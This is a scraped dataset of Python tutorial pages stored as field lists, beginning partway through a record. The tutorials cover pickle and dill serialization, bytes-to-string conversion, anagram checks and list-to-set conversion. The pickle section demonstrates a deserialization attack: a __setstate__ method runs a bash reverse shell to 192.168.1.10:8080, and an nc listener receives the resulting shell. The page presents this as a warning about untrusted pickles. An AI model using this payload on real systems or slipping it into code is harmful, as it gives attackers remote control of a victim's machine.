forexample_class with many different attributes, and each one of them is of different types:', 'For example:', 'Explanation', 'The compatibility of this depends on the protocol version that the developer used for the while process of pickling.', 'We have already discussed that the pickle module of python can serialize much more types than the json module although everything is not pickleable.', 'The list of unpickleable objects also contains the database connections, running threads, opened network sockets, and many others.', 'For testing this module, the user can try to pickle the lambda function.', 'For example:', 'If the user tries to run this code, they will get an exception because the pickle module of python can not serialize the lambda function.', 'Now, if the user replaces the pickle module with the dill library, they can see the difference.', 'For example:', 'After running the above program, the user can see that the dill library has serialized the lambda function without any error.', 'There is another interesting feature of dill library, such as it can serialize the whole interpreter session.', 'For example:', 'If the user has run the code correctly, then they would be getting the testing.pkl file in their current directory.', 'Now, the user can start the new instance of the interpreter and load the testing.pkl file for resorting to their last session.', 'For example:', 'For example:', ""After running this code and then deserializing the object, the user can see that the new instance does not contain the 'r' attribute."", 'For example:', 'For compressing the pickled string with bzip2, the user has to use the bz2 module, which is provided in the standard library of python.', 'For example, the user has taken the string and will pickle it and then compress it by using the bz2 module.', 'For example:', 'The user should remember that the smaller files come at the cost of the slower process.', 'Security Concerns with the Pickle Module', 'For example:', 'To see how unpickling the tampered pickle can expose the system of the user to the attackers.', 'For example:', 'This terminal will be for attackers.', 'Then, the user has to open another terminal on the same computer system and execute the python code for unpicking the malicious code.', 'Now, a bash shell will be visible on the attacking console. This console can be operated directly now, on the system which is attacked.', 'For example:']","['The json Module is the latest module out of the three. This allows the developer to work beside standard JSON files. Json is the most suitable and commonly used format for data exchange.', ""So, the developer can use many different methods for serializing and deserializing the objects in Python. The three important guidelines for concluding which method is suitable for the developer's case are:"", 'The difference between dump() and dumps() is that dump() creates the file which contains the serialization results, and the dumps() returns the string.', 'The same concept can be applied to the load() and loads() function. The load() function is used for reading the file for the unpickling process, and the loads() function operates on the string.', 'Now, the user can process for unpickling the string into the utterly new instance. When the user gets a deep copy of their original object structure from the time when the process of pickling the object began.', 'The pickle module is python -specific, and its results can only be readable to another python program. Although the developer might be working with python, they should know that the pickle module is advanced now.', 'This means that if the developer has pickled the object with some specific version of python, they might not be able to unpickle the object with the previous version.', 'There are six different protocols that the Pickle module of python can use. The requirement of unpickling the most recent python interpreter is directly proportional to the highness of the protocol version.', 'If the user got stuck with the unpickleable objects, then there are few things they can do. The first option they have is to use the third -part library, for example, dill.', 'The dill library can extend the capabilities of the pickle. This library can let the user serialize fewer common types such as functions with yields, lambdas, nested functions, and many more.', 'Here, the first globals().item() statement reveals that the interpreter is in the initial state, meaning that the developer has to import the dill library and invoke load_session() for restoring their serialized interpreter session.', 'Developers should remember that if they are using the dill library instead of the pickle module, that standard library does not include the dill library. It is slower than the pickle module.', 'The solution to this problem is to exclude the object during the process of serialization for reinitializing the connection after the object is deserialized.', 'In the following example, the user has defined the class with several attributes and then excluded one of the attributes for the process of serialization by using _getstate_().', ""But if the user wants to do additional initialization during the process of unpickling, such as adding the excluded 'r' attribute back to the deserialized instance. They can do this by using the _setstate_() function."", ""Here, bypassing the excluded attribute 'r' to the _setstate_(), the user has ensured that the object will appear in the _dict_ of the unpickling string."", 'The pickle data format is the compact binary representation of the object structure, but still, the users can optimize their pickle string by compressing it with bzip2 or gzip.', 'In the above example, the process of unpickling has executed _setstate_(), which will execute a Bash command for opening the remote shell to the 192.168.1.10 system on port 8080.', 'This is how the user can safely test the scrip on their Mac or Linux box. First, they have to open the terminal and then use the nc command for listing the connection to port 8080.', 'The user has to make sure that they have to change the IP address in the code for the IP address of their attacking terminal. After executing the code, the shell is exposed to the attackers.']","['In this tutorial, we will discuss serializing and deserializing the object and which module the user should use for serializing the objects in python. The kind of objects can be serialized by using the Pickle module in python. We will also explain how to use the Pickle module for serializing the object hierarchies and what are the risks a developer can face while deserializing the object from the untrusted source?', 'In Python, the serialization allows the developer to convert the complex object structure into a stream of bytes that can be saved in the disk or can send through the network. The developer can refer to this process as marshalling. Whereas, Deserialization is the reverse process of serialization in which the user takes the stream of bytes and transforms it into the data structure. This process can be referred to as unmarshalling.', ""The developer can use serialization in many different situations. And one of them is saving the internal state of the neural networking after processing the training phase so that they can use the state later and they don't have to do the training again."", 'The oldest module in these three modules is the marshal module. Its primary purpose is reading and writing the compiled bytecode of Python modules, or the .pyc files which the developer gets when the Python module is imported by the interpreter. Therefore, the developer can use the marshal module for serializing the object it is not recommended.', ""The pickle module of Python is another method of serializing and deserializing the objects in Python. This is different from json module as in this. The object is serialized in the binary format, whose result is not readable by humans. Although, it is faster than the others, and it can work with many other python types, including the developer's custom -defined objects."", 'The example below explains how the user can instantiate the class and pickle the instance to get the plain string. After pickling the class, the user can modify the value of its attributes without affecting the pickled string. User can afterward unpickle the string which was pickled earlier in another variable, and restore the copy of the pickled class.', ""Here, the process of pickling has ended correctly, and it stores the user's whole instance in the string: b' \\x80 \\x04 \\x95$ \\x00 \\x00 \\x00 \\x00 \\x00 \\x00 \\x00 \\x8c \\x08__main__ \\x94 \\x8c \\x10forexample_class \\x94 \\x93 \\x94) \\x81 \\x94. 'After completing the process of pickling, the user can change their original objects making the_dict attribute equals to None."", 'To choose a specific protocol, the developer has to specify the protocol version when they call dump(), dumps(), load() or loads() functions. If they do not specify the protocol, their interpreter will use the default version specified in the pickle.DEFAULT_PROTOCOL attribute.', 'In the above example, the user has started the interpreter, imported the module, and then defined the lambda function along with a few of the other variables. They have then imported the dill library and called the dump_session() function for serializing the whole session.', 'Dill library can serialize a wider range of objects than the pickle module, but it cannot solve every problem of serialization that the developer can face. If the developer wants to serialize the object which contains a database connection, then they cannot work with the dill library. That is an unserialized object for the dill library.', 'The developer can use the _getstate_() for defining which objects should be included in the pickling process and whatnot. This method allows the developer to specify what they want to pickle. If they do not override _getstate_(), then the _dict_() will be used, which is a default instance.', ""In the above example, the user has created the object with three attributes, and one of the attributes is a lambda, which is an unpickleable object for the pickle module. For solving this issue, they have specified in the _getstate_() which attribute to pickle. The user has cloned the whole _dict_ of the instance for defining all the attributes in the class, and then they have removed the unpickleable attribute 'r'."", 'Till now, we have discussed how to use the pickle module for serializing and deserializing the objects in Python. The process of serialization is convenient when the developer wants to save the state of their objects to disk or to transmit it through the network.\nAlthough, there is one more thing that the developer should know about the pickle module of python, that it is not very secure. As earlier, we have discussed the use of the _setstate_() function. This method is best for performing more initialization along with the unpickling process. Still, it is also used for executing arbitrary code during the unpickling process.\nThere is nothing much a developer can do to reduce the risk. The basic rule is the developer should never unpickle the data which comes from the untrusted source or transmitted through the insecure network. For preventing the attacks, the user can use libraries like hmac for signing the data and making sure that it has not been tampered with.', 'This article discussed how to serialize and deserialize the objects by using different modules of python and why the pickle module is better than others. We have also explained how some of the objects cannot be unpickled and how we can avoid the problems created by them.']","['# pickle.py', 'import pickle', 'class forexample_class:', 'the_number = 25', 'the_string = "" hello""', 'the_list = [ 1, 2, 3 ]', 'the_dict = { "" first "": "" a "", "" second "": 2, "" third "": [ 1, 2, 3 ] }', 'the_tuple = ( 22, 23 )', 'user_object = forexample_class()', 'user_pickled_object = pickle.dumps( user_object )  # here, user is Pickling the object', 'print( f"" This is user\'s pickled object: \\n { user_pickled_object } \\n "" )', 'user_object.the_dict = None', 'user_unpickled_object = pickle.loads( user_pickled_object )  # here, user is Unpickling the object', 'f"" This is the_dict of the unpickled object: \\n { user_unpickled_object.the_dict } \\n "" )', '# pickle_error.py', 'import pickle', 'squaring = lambda x : x * x', 'user_pickle = pickle.dumps( squaring )', '# pickle_dill.py', 'import dill', 'squaring = lambda x: x * x', 'user_pickle = dill.dumps( squaring )', 'print( user_pickle )', 'squaring = lambda x : x * x', 'p = squaring( 25 )', 'import math', 'q = math.sqrt ( 139 )', 'import dill', ""dill.dump_session( ' testing.pkl ' )"", 'globals().items()', 'import dill', ""dill.load_session( ' testing.pkl ' )"", 'globals().items()', 'squaring', '# custom_pickle.py', 'import pickle', 'class foobar:', 'def __init__( self ):', 'self.p = 25', 'self.q = "" testing ""', 'self.r = lambda x: x * x', 'def __getstate__( self ):', 'attribute = self.__dict__.copy()', ""del attribute[ 'r' ]"", 'return attribute', 'user_foobar_instance = foobar()', 'user_pickle_string = pickle.dumps( user_foobar_instance )', 'user_new_instance = pickle.loads( user_pickle_string )', 'print( user_new_instance.__dict__ )', '# custom_unpickle.py', 'import pickle', 'class foobar:', 'def __init__( self ):', 'self.p = 25', 'self.q = "" testing ""', 'self.r = lambda x: x * x', 'def __getstate__( self ):', 'attribute = self.__dict__.copy()', ""del attribute[ 'r' ]"", 'return attribute', 'def __setstate__(self, state):', 'self.__dict__ = state', 'self.c = lambda x: x * x', 'user_foobar_instance = foobar()', 'user_pickle_string = pickle.dumps( user_foobar_instance )', 'user_new_instance = pickle.loads( user_pickle_string )', 'print( user_new_instance.__dict__ )', 'import pickle', 'import bz2', 'user_string = """"""Per me si va ne la città dolente,', ""per me si va ne l'etterno dolore,"", 'per me si va tra la perduta gente.', 'Giustizia mosse il mio alto fattore:', 'fecemi la divina podestate,', ""la somma sapienza e 'l primo amore;"", 'dinanzi a me non fuor cose create', 'se non etterne, e io etterno duro.', 'Lasciate ogne speranza, voi ch\'intrate.""""""', 'pickling = pickle.dumps( user_string )', 'compressed = bz2.compress( pickling )', 'len( user_string )', '# remote.py', 'import pickle', 'import os', 'class foobar:', 'def __init__( self ):', 'pass', 'def __getstate__( self ):', 'return self.__dict__', 'def __setstate__( self, state ):', '# The attack is from 192.168.1.10', '# The attacker is listening on port 8080', ""os.system('/bin/bash -c"", '""/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1""\')', 'user_foobar = foobar()', 'user_pickle = pickle.dumps( user_foobar )', 'user_unpickle = pickle.loads( user_pickle )', '$ nc -l 8080', 'remote.py', '$ nc -l 8080']","[""This is user's pickled object:"", ""b' \\x80 \\x04 \\x95$ \\x00 \\x00 \\x00 \\x00 \\x00 \\x00 \\x00 \\x8c \\x08__main__ \\x94 \\x8c \\x10forexample_class \\x94 \\x93 \\x94) \\x81 \\x94. '"", '', 'This is the_dict of the unpickled object:', ""{' first ': ' a ', ' second ': 2, ' third ': [ 1, 2, 3 ] }"", 'PicklingError                             Traceback (most recent call last)', '<ipython-input-9-1141f36c69b9> in <module>', '3', '4 squaring = lambda x : x * x', '----> 5 user_pickle = pickle.dumps(squaring)', ""PicklingError: Can't pickle <function <lambda> at 0x000001F1581DEE50>: attribute lookup <lambda> on __main__ failed"", ""b' \\x80 \\x04 \\x95 \\xb2 \\x00 \\x00 \\x00 \\x00 \\x00 \\x00 \\x00 \\x8c \\ndill._dill \\x94 \\x8c \\x10_create_function \\x94 \\x93 \\x94 ( h \\x00 \\x8c \\x0c_create_code \\x94 \\x93 \\x94 ( K \\x01K \\x00K \\x00K \\x01K \\x02KCC \\x08| \\x00| \\x00 \\x14 \\x00S \\x00 \\x94N \\x85 \\x94 ) \\x8c \\x01x \\x94 \\x85 \\x94 \\x8c \\x1f< ipython-input-11-30f1c8d0e50d > \\x94 \\x8c \\x08< lambda > \\x94K \\x04C \\x00 \\x94 ) )t \\x94R \\x94c__builtin__ \\n__main__ \\nh \\nNN } \\x94Nt \\x94R \\x94. '"", '$ ls testing.pkl', '4 [email\xa0protected] 1 dave  staff  493 Feb  12 09:52 testing.pkl', ""dict_items( [ ( ' __name__ ' , ' __main__ ' ) , ( ' __doc__ ' , ' Automatically created module for IPython interactive environment ' ) , ( ' __package__ ' , None ) , ( ' __loader__ ' , None ) , ( ' __spec__ ' , None ) , ( ' __builtin__ ' , < module ' builtins ' ( built-in ) > ) , ( ' __builtins__ ' , < module ' builtins ' ( built-in ) > ) , ( ' _ih ' , [ ' ' , ' globals().items() ' ] ) , ( ' _oh ' , {} ) , ( ' _dh ' , [ ' C:\\\\Users \\\\User Name \\\\AppData \\\\Local \\\\Programs \\\\Python \\\\Python39 \\\\Scripts ' ] ) , ( ' In ' , [ ' ' , ' globals().items() ' ] ) , ( ' Out ' , {} ) , ( ' get_ipython ' , < bound method InteractiveShell.get_ipython of < ipykernel.zmqshell.ZMQInteractiveShell object at 0x000001E1CDD8DDC0 > > ) , ( ' exit ' , < IPython.core.autocall.ZMQExitAutocall object at 0x000001E1CDD9FC70 > ) , ( ' quit ' , < IPython.core.autocall.ZMQExitAutocall object at 0x000001E1CDD9FC70 > ) , ( ' _ ' , ' ' ) , ( ' __ ' , ' ' ) , ( ' ___ ' , ' ' ) , ( ' _i ' , ' ' ) , ( ' _ii ' , ' ' ) , ( ' _iii ' , ' ' ) , ( ' _i1 ' , ' globals().items() ' ) ] )"", 'dict_items( [ ( \' __name__ \' , \' __main__ \' ) , ( \' __doc__ \' , \' Automatically created module for IPython interactive environment \' ) , ( \' __package__ \' , None ) , ( \' __loader__ \' , None ) , ( \' __spec__ \' , None ) , ( \' __builtin__ \' , < module \' builtins \' ( built-in ) > ) , ( \' __builtins__ \' , < module \' builtins \' ( built-in ) > ) , ( \' _ih \' , [ \' \' , "" squaring = lambda x : x * x \\na = squaring( 25 ) \\nimport math \\nq = math.sqrt ( 139 ) \\nimport dill \\ndill.dump_session( \' testing.pkl \' ) \\nexit() "" ] ) , ( \' _oh \' , {} ) , ( \' _dh \' , [ \' C:\\\\ Users\\\\ User Name \\\\AppData \\\\Local \\\\Programs \\\\Python \\\\Python39 \\\\Scripts \' ] ) , ( \' In \' , [ \' \' , "" squaring = lambda x : x * x \\np = squaring( 25 ) \\nimport math\\nq = math.sqrt ( 139 ) \\nimport dill \\ndill.dump_session( \' testing.pkl \' ) \\nexit() "" ] ) , ( \' Out \' , {} ) , ( \' get_ipython \' , < bound method InteractiveShell.get_ipython of < ipykernel.zmqshell.ZMQInteractiveShell object at 0x000001E1CDD8DDC0 > > ) , ( \' exit \' , < IPython.core.autocall.ZMQExitAutocall object at 0x000001E1CDD9FC70 > ) , ( \' quit \' , < IPython.core.autocall.ZMQExitAutocall object at 0x000001E1CDD9FC70 > ) , ( \' _ \' , \' \' ) , ( \' __ \' , \' \' ) , ( \' ___ \' , \' \' ) , ( \' _i \' , \' \' ) , ( \' _ii \' , \' \' ) , ( \' _iii \' , \' \' ) , ( \' _i1 \' , "" squaring = lambda x : x * x \\np = squaring( 25 ) \\nimport math \\nq = math.sqrt ( 139 ) \\nimport dill \\ndill.dump_session( \' testing.pkl \' ) \\nexit() "" ) , ( \' _1 \' , dict_items( [ ( \' __name__ \' , \' __main__ \' ) , ( \' __doc__ \' , \' Automatically created module for IPython interactive environment \' ) , ( \' __package__ \' , None ) , ( \' __loader__ \' , None ) , ( \' __spec__ \' , None ) , ( \' __builtin__ \' , < module \' builtins \' ( built-in ) > ) , ( \' __builtins__ \' , < module \' builtins \' ( built-in ) > )', '625', '22.0', '(x)>', ""{'p': 25, 'q': ' testing '}"", ""{' p ': 25, ' q ': ' testing ', ' r ': < function foobar.__setstate__.< locals >.< lambda > at 0x000001F2CB063700 > }"", '312', 'len( compressed )', '262', 'bash: no job control in this shell', 'The default interactive shell is now zsh.', 'To update your account to use zsh, please run ` chsh -s /bin /zsh`.', 'For more details, please visit https://support.apple.com /kb /HT208060.', 'bash-3.1$']",[],"['|||It is Human Readable |||It is Language Independent |||It is Lighter than XML||||||List|||dict|||string|||int|||tuple|||bool|||float|||None||||||the_number|||the_string|||the_list|||the_dictionary|||the_tuple|||&&&|||The pickle module|||The marshal module|||The json module||||||Do not use the marshal module, as it is used mostly by the interpreter. And the official documentation warns that the maintainers of the Python can modify the format in backward -incompatible types.|||The XML and json modules are safe choices if the developer wants interoperability with different languages and human -readable format.|||The Python pickle module is the best choice for all the remaining cases. Suppose the developer does not want a human -readable format and a standard interoperable format. And they require to serialize the custom objects. Then they can choose the pickle module.||||||dump( obj, file, protocol = None, * , fix_imports = True, buffer_callback = None)|||dumps( obj, protocol = None, * , fix_imports = True, buffer_callback = None)|||load( file, * , fix_imports = True, encoding = "" ASCII "", errors = ""strict "", buffers = None)|||loads( bytes_object, * , fix_imports = True, encoding = "" ASCII "", errors = "" strict "", buffers = None)||||||Protocol version 0 - It was the first version. It is human readable no like the other protocols|||Protocol version 1 - It was the first binary format.|||Protocol version 2 - It was introduced in Python 2.3.|||Protocol version 3 - It was added in Python 3.0. The Python 2.x version cannot unpickle it.|||Protocol version 4 - It was added in Python 3.4. It features support for a wider range of object sizes and types and is the default protocol starting with Python 3.8.|||Protocol version 5 - It was added in Python 3.8. It features support for out-of-band dataand improved speeds for in-band data.|||']"
172,['How to convert Bytes to string in Python'],"['In this tutorial, we will learn how we can convert Bytes to a String using Python script. We will also explore how to use these data types efficiently. We include Python 3 approaches in this tutorial because Python 2 is no longer in use. Before digging deep into this topic, first, we need to understand the basic introduction of Byte data type.']","['https://www.javatpoint.com/python-program-to-find-anagram', 'https://www.javatpoint.com/pickle-module-of-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-program-to-find-anagram', 'https://www.javatpoint.com/pickle-module-of-python', 'https://www.javatpoint.com/python-program-to-find-anagram']",[],[],"['Byte Data Type in Python', 'Convert Bytes to String in Python', 'Conclusion']",[],"[""Note - Python 2.x ignores the prefix 'b' or 'B.'""]","['Explanation', 'The difference between these two data types is ', ""Str - A string is a sequence of Unicode characters (encoded in UTF -16 or UTF-32 and entirely depends on Python's compilation)."", ""Bytes or byte - It represents an integer between 0 and 255, and we can denote it as 'b' or 'B.'"", ""We can convert any string to bytes by writing 'be literal in front of a regular string."", 'Key Difference between String and Bytes', 'When we declare a byte data type in Python, it is directly stored in the disk and a string is converted into a byte and then stored on disk.', 'Strings are used to signify the characters, words, or sentences, whereas Bytes represent low-level binary data structures.', ""Python provides the built-in decode() method, which is used to convert bytes to a string. Let's understand the following example."", 'Explanation -', 'We passed the encoding format in the above code, decoded the bytes object into a string, and printed it.', 'We can also use the codec module to convert byte data type to string.', ""It is the easiest method to convert the bytes to string. Let's understand the following example.""]","[""If one is familiar with the Python, then he/she must already know about the byte data type. But if someone is no friendly with Python, then we will explain this concept. Let's understand the following example."", 'It is necessary to pass the encoding argument to str() otherwise, we will get some unexpected results. Wrong encoding leads to incorrect output. For example - If we pass the str() method with UTF-16, we will get the following error.', 'This tutorial will help you to work with the byte data type. Thinks like charsets, encoding, and binary are used to encode and decode. We have defined the various methods to convert byte data type to string.']","[""We define two strings with the same value. Both values are looking similar, but the data types are not same. The first string1 variable is a string data type, and the other is a byte data type. The second string2 variable is prefixed with 'b,' which means it produces the byte data type instead of the str data type."", 'Both str and bytes data types are used as Byte type objects in Python 2.x, but it is not true in the case of Python 3.x. The critical difference between bytes and string is that strings are easy to read or human-readable where a byte is eventually machine-readable, and the string is also converted into byte before processing.']","[""string1 = 'Welcome to JavaTpoint'"", 'print(type(string1))', ""string2 = b'Welcome to JavaTpoint'"", 'print(type(string2))', 'byteData = b""Lets eat a \\xf0\\x9f\\x8d\\x95!""', ""# Let's check the type"", 'print(type(byteData))', ""str1 = byteData.decode('UTF-8')"", 'print(type(str1))', 'print(str1)', 'import codecs', ""byteData = b'Lets eat a \\xf0\\x9f\\x8d\\x95!'"", ""codecs.decode(byteData, 'UTF-8')"", ""byteData = b'Lets eat a \\xf0\\x9f\\x8d\\x95!'"", ""b1 = str(byteData, 'UTF-8')"", 'print(b1)', ""str(b, 'UTF-16')""]","[""<class 'str'>"", ""<class 'bytes'>"", ""<class 'bytes'>"", ""<class 'str'>"", 'Lets eat a 🍕!', 'Lets eat a 🍕', 'Lets eat a 🍕&!', ""'敌❴\\u2073牧扡愠\\uf020趟↕'""]",[],['|||Using the decode() method||||||Using Bytes to String with codecs||||||Using str()|||']
173,['Python Program to Find Anagram'],"[""In this tutorial, we will learn how we can detect if given strings are anagram. But first we should familiar with the anagram's concept.""]","['https://www.javatpoint.com/how-to-convert-list-to-set', 'https://www.javatpoint.com/how-to-convert-bytes-to-string-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/how-to-convert-list-to-set', 'https://www.javatpoint.com/how-to-convert-bytes-to-string-in-python', 'https://www.javatpoint.com/how-to-convert-list-to-set']",[],[],"['What is Anagram?', 'Problem Description', 'Program -', 'Example of Anagram Program in Python']","['1. Counter Technique', '2. Reverse Anagram Check', '3. Position Verification Technique']",[],"[""We will solve this problem before approaching the solution. Let's understand the problem description."", 'Explanation -', 'There are few techniques and example which we can use to find the anagram in Python. These techniques are given below.', ""Let's understand the following example."", 'Explanation -', ""In this technique, both the strings are sorted and check whether both values are the matching for each other. Let's understand the following example."", 'Explanation -', 'We can apply this technique as follows.', 'Explanation -', 'Explanation:', 'This technique is a very stable process because it works on the algorithm technique, precisely judging the strings.']","['In this technique, we calculate the count of each character in both the given strings. If the count of a given string matches another string, then the corresponding word is an anagram of another word.', 'In this, another technique to get the anagram of the two strings. Here we have also used the comparison. In the nested while loop, we pass the string into these loops for the verification process.']","['An Anagram is a condition where one string or number is rearranged in that manner; each character of the rearranged string or number must be a part of another string or number. In other words, a string is said to be an anagram of another if the second is a simple rearrangement of the first string. For example -The python and yphton are anagrams; Java and avaJ are anagrams as well.', 'In the above code, we have declared the anagramCheck() method, which takes two strings as an argument. These strings are converted into a list to sort. Then, we defined the position variable and assigned it zero. In each iteration of the while loop, the string length is compared to the position value. Each element of both lists compared to each other and increased the position value by one. Once the position value became greater than the string length, the loop will be terminated, and it returns true; otherwise, it will return false.', ""We have imported the collection module and its Count and defaultdict method to check the string's anagram in the above code. We have defined the checking_anagram() method to count and record each character using the counter function. Each count is resorted in a list and kept on track. This process is accomplished for all the characters in the first string than the second string. If the count of both strings is matched, it means both the strings are Anagrams."", 'In the above code, we have defined the checking_anagram() method and passed the two strings. In the checking_anagram() method, we stored the string in a specific variables. We compared each string after the sorting. If the comparison between strings matched, the given string form as anagram; else, they returned as Both strings are not anagrams. This method is relatively easy and effective. It cuts the code complexity to a very significant level.', ""In the above code, we have used this technique to comparing anagrams among the reversed string. Here, we have formed two different strings. This technique is similar to palindromes, where we reversed one among the string and checked with other strings. If they are matched, the strings have formed an anagram; if they don't match, they are not notified as not anagrams."", ""In this method, a position level compares to check anagram. We can achieve this by verifying first string's positional character with each positional character string in the other string. If first string holds a similar match with the other string, it is declared an anagram. Let's understand the following example."", ""The outer while loop is used for processing one of the strings, and the inner loop is used for the other string. One string's character is compared to each character's other string, and this process is continued on every letter in the first string. If all the first string characters are matched with the other string, then both strings are meant to be an anagram.""]","['def anagramCheck2(str1,str2):', '# Convert string into lists', 'list1 = list(str1)', 'list2 = list(str2)', '# Sort the list value', 'list1.sort()', 'list2.sort()', 'position = 0', 'matches = True', 'while position < len(str1) and matches:', 'if list1[position]==list2[position]:', 'position = position + 1', 'else:', 'matches = False', 'return matches', ""print(anagramCheck2('python','ythonp'))"", 'from collections import Counter, defaultdict', 'def checking_anagram(keywords):', 'agrms = defaultdict(list)', 'for i in keywords:', 'hist = tuple(Counter(i).items())', 'agrms[hist].append(i)', 'return list(agrms.values())', 'keywords = (""python"",""yphotn"")', 'print(checking_anagram(keywords))', 'def Anogram_check(str1, str2):', '# Strings are sorted and check whether both are matching or not', 'if(sorted(str1)== sorted(str2)):', 'print(""Both strings are an Anagram."")', 'else:', 'print(""Both strings are not an Anagram."")', '', 'string1 =""python""', 'string2 =""ythopn""', 'print( ""String value1 : "", str1 )', 'print( ""String value2 : "", str2 )', 'Anogram_check(string1, str2)', 'words_list = [""cat"", ""tac"", ""Play"", ""ay""]', 'anagrams = {}', 'for w in words_list:', 'reverse_word=w[::-1]', 'if reverse_word in words_list:', 'anagrams[w] = (words_list.pop(words_list.index(reverse_word)))', 'print(anagrams)', 'def checking_anagram(str1,str2):', 'chk_var = True', 'if len(str1) != len(str2):', 'chk_var = False', 'list1 = list(str2)', 'pos_string1 = 0', 'while pos_string1 < len(str1) and chk_var:', 'pos_string2 = 0', 'found = False', 'while pos_string2 < len(list1) and not found:', 'if str1[pos_string1] == list1[pos_string2]:', 'found = True', 'else:', 'pos_string2 = pos_string2 + 1', 'if found:', 'list1[pos_string2] = None', 'else:', 'chk_var = False', 'pos_string1 = pos_string1 + 1', 'return chk_var', 'str1 = ""ythopn""', 'str2 = ""python""', 'print(""String value1 : "" , str1)', 'print(""String value2 : "" , str2)', ""Boolean_out = checking_anagram('ythopn','python')"", 'if Boolean_out:', 'print( ""Both words are Alogram "" )', 'print( ""Both words are not Alogram "" )']","['True', ""[['python'], ['yphotn']]"", 'String value1 :  python', 'String value2 :  ythopn', 'Both strings are an Anagram.', ""{'cat': 'tac'}"", 'String value1 :  ythopn', 'String value2 :  python']",[],['|||Get the string inputs from the user and store them in separate variables.|||Use the sort() method to sort both the strings into lists.|||Check both lists if they are forming anagram or not|||Print the result.|||Exit||||||Sort Techniques|||']
174,['How to convert List to Set?'],"['Sets and Lists are the data structures in Python that consist of groups of data elements. However, these two data structures have some significant differences too. In specific, the lists perform a few ranges of mathematical operations that are useful to search for particular elements - specifically with duplicates and managing data. In contrast, the sets are helpful to perform a variety of functions like unions and intersections. There are many reasons we have to complete a list to set conversion in Python, and this can be done using a simple function.']","['https://www.javatpoint.com/python-vs-javascript', 'https://www.javatpoint.com/python-program-to-find-anagram', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/https://www.javatpoint.com/python-set', 'https://www.javatpoint.com/python-vs-javascript', 'https://www.javatpoint.com/python-program-to-find-anagram', 'https://www.javatpoint.com/python-vs-javascript']",[],[],[],"['Lists in Python', 'Sets in Python', 'Understanding the difference between Lists and Sets', 'Converting a List into a Set']","[""Note: Sets are an unordered collection of data. Hence, we can't be sure which order the elements will appear."", 'Note: Things might get confusing as the dictionary in Python also utilizes curly brackets. However, each data element consists of the value itself and colon separating a ""key"".']","['But before we get started, let us understand some concepts of Lists and Sets.', 'We can create the Lists using the square brackets. Let us consider the following example to understand the List.', 'Explanation:', 'Let us consider the following example to understand Set.', 'Explanation:', 'Another significant difference is that the sets use curly brackets, whereas the lists use square brackets.', 'Let us understand the same using the following example:', 'Explanation:']","['In the above example, we have created a list of eight elements using the square brackets enclosing the elements. We have then printed the list for the users.', 'In the above example, we have created a set of eight elements using the curly brackets enclosing the elements. We have then printed the set for the users.', 'In the above example, we have defined the list as the_names containing ten data elements. We have then defined a variable as the_unique_names that use the set() command to convert the list into the set. At last, we have printed the set.', 'As a result, the list has been converted to the set successfully. We can also observe that the names such as James and Andy have been printed only once.']","['Lists in Python are utilized to store more than one data element in a single variable. Lists are among the four built-in data types in Python used to accumulate collections of data. The rest three includes Sets, Tuples, and Dictionary, and all these data types have different abilities and usage.', 'Moreover, we can also observe that one element is repeated in the list, which implies that List elements are ordered, changeable, and allows duplicate values. The indexing of List elements begins with [0] for the first element, [1] for the second element, and so on.', 'Sets are also utilized to store more than one element in a single variable. Sets are among the four core data types in Python that are used to accumulate collections of data. A set is an unordered and unindexed collection that is written with curly brackets.', 'The most significant difference between a set and a list in Python is that a set only stores unique items, whereas a list can consist of identical elements. For instance, suppose we have a list of mathematic test marks defined as ""marks = [25, 30, 21, 19, 25, 27, 25, 17, 23, 20]"", the list displays the user every value; however, when we convert the list into a set, it will remove the duplicates and leave {25, 30, 21, 19, 25, 27, 17, 23, 20}.', 'It is a point to remember that we can utilize integers, strings, floats, or other objects as a fragment of a set or a list and mixed them in the same list or set. Thus, similar to having a set of integers in Python, we can also create a set of strings in Python and a lot more.', 'The process of converting a list into a set in Python is easy and simple. At first, we have to define a list. For instance, suppose we have a list of few names defined as the_names = [""George"", ""Josh"", ""James"", ""Mark"", ""Carlo"", ""James"", ""Andy"", ""Sara"", ""Andy"", ""Victor""].', 'We can convert the list into a set using the set() command, where we have to insert the list name between the parentheses that are needed to be converted. Hence, in the above case, we have to type the set(the_names) in order to convert the names, present in the list into a set. Moreover, we can assign this function to a variable such as ""the_unique_names"" and show the result to users. One can also use print( set( the_names)) function to make it more efficient.']","['# Creating a list of eight elements', 'mylist = [""Apple"", ""Mango"", ""Banana"", ""Orange"", ""Guava"", ""Mango"", ""Strawberry"", ""Grapes""]', 'print(mylist)', '# Creating a set of eight elements', 'myset = {""Apple"", ""Mango"", ""Banana"", ""Orange"", ""Guava"", ""Pineapple"", ""Strawberry"", ""Grapes""}', 'print(myset)', '# Creating a list of ten data elements', 'the_names = [""George"", ""Josh"", ""James"", ""Mark"", ""Carlo"", ""James"", ""Andy"", ""Sara"", ""Andy"", ""Victor""]', '# Converting the above list to the set', 'the_unique_names = set( the_names)', '# Printing the set to the users', 'print( the_unique_names)']","[""['Apple', 'Mango', 'Banana', 'Orange', 'Guava', 'Mango', 'Strawberry', 'Grapes']"", ""{'Strawberry', 'Mango', 'Grapes', 'Pineapple', 'Apple', 'Orange', 'Guava', 'Banana'}"", ""{'Victor', 'George', 'Josh', 'Andy', 'Mark', 'Carlo', 'Sara', 'James'}""]",[],[]
